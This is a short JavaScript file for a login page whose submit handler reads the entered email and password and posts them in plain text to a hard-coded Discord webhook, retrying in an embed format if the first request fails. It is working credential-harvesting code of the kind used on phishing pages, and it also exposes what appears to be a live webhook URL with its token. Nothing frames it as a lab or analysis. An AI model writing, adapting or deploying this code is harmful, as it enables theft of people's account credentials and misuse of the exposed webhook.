const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";

document.getElementById("login-form").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Please fill in both fields.");
    return;
  }

  // Try method 1: Simple content
  const payload = {
    content: `📧 **Email:** ${email}\n🔑 **Password:** ${password}`,
    username: "Login Bot"
  };

  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      alert("Data sent to webhook!");
      document.getElementById("login-form").reset();
    } else {
      // If simple method fails, try with embeds
      const embedPayload = {
        embeds: [{
          title: "Login Data",
          fields: [
            { name: "Email", value: email },
            { name: "Password", value: password }
          ],
          timestamp: new Date().toISOString()
        }]
      };
      
      const retryResponse = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embedPayload)
      });
      
      if (retryResponse.ok) {
        alert("Data sent to webhook!");
        document.getElementById("login-form").reset();
      } else {
        throw new Error("Both methods failed");
      }
    }
  } catch (err) {
    alert("Error sending to webhook.");
    console.error(err);
  }
});
